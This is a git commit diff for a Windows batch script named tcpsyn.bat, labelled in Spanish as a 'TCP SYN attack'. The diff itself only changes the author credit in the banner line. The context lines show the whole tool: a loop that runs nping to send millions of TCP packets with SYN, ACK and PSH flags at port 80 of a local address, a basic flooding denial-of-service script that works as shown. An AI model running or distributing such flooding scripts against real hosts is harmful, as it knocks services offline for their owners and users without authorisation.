ac106907c9f7888e7b1992be5955734661989402
bootpc <bootpc@hotmail.com>
2017-05-10 13:20:23 +0200

    Update tcpsyn.bat

--- tcpsyn.bat
+++ tcpsyn.bat
@@ -1,5 +1,5 @@
 @ECHO OFF
-ECHO ATAQUE TCP SYN (c) hackingyseguridad 2016. Version 2.
+ECHO ATAQUE TCP SYN (c) Antonio Taboada 2016. Version 2.
 ECHO Requiere tener instalado en el PC, nping incluido en Zenmap https://nmap.org/download.html
 :loop
 nping --tcp-connect --flags syn,ack,psh -rate=9 -c 9999999 --ttl 255 -p 80 -q 192.168.1.252
